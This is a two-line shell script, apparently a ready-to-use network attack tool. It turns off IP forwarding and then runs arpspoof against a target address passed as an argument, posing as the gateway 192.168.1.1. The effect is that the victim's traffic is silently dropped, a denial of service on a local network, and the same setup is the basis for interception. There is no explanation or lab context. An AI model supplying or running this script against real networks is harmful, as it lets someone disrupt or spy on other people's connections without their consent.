#!/bin/sh

echo -n 0 > /proc/sys/net/ipv4/ip_forward #turn off redirecting packets
arpspoof -t $1 192.168.1.1
